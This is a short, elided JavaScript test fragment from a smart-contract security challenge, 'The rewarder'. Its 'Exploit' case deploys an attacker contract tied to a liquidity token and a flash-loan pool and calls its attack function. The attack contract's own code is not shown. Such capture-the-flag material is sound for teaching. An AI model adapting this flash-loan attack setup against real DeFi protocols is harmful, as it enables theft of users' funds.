...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    ...
    const TheRewarderPoolAttackerFactory = await ethers.getContractFactory(
      "TheRewarderPoolAttacker",
      deployer
    );

    const theRewarderPoolAttacker = await TheRewarderPoolAttackerFactory.deploy(
      this.liquidityToken.address,
      this.flashLoanPool.address,
    ...
    await theRewarderPoolAttacker.connect(attacker).attack();
  });
